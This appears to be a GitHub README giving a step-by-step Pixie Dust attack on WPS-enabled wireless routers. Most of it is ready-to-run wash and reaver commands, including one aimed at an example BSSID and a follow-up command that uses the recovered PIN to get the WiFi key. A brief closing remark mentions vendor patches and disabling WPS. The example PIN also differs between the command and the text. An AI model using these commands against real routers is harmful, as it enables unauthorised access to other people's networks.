(https://github.com/KKCyberExpert/Pixie-Dust-Attack----Crack-Wireless-Routers/assets/153437848/f4659278-5174-4410-86bf-3a79b17b2165)

# Pixie-Dust-Attack----Crack-Wireless-Routers
Pixie Dust Attack -- Crack Wireless Routers



Pixie Dust Attack
As we told we need a WiFi adapter that supports monitor mode. The first thing we need to do put our interface in the monitor mode. We can check the list of interfaces by using following command:

iwconfig

sudo wash -i wlan1mon -s

We need to use the command as this   ---->
sudo reaver -i <monitor-mode-interface> -b <target-BSSID> -d 7 -c <No. of channel> -K 1 --mac -vv

sudo reaver -i wlan1mon -b <Your -BSSID> -d 7 -c <Channel> -K 1 --mac -vv   ---------> example --------->  sudo reaver -i wlan1mon -b 40:C8:CB:05:4D:19 -d 7 -c 6 -K 1 --mac -vv


After collecting the pin we can easily get the WPS key by simply removing -K flag and using -p flag following the noted PIN.

An example command will be like following: -------->    sudo reaver -i wlan1mon -b 40:C8:CB:05:4D:19 -vvNwL -c 1 -p 19666197


Here we assume that 1966619 is our noted pin.

This method is very very effective if the target still using old WiFi router. This attack goes back to early 2010s and most of the vendors have already patched this issue.

This vulnerability can be patched by turning off WPS feature. The router vendors then uses mac blocking for too much WPS requests. So, it doesn't mean that we can get WPS PIN of every WPS enabled routers.
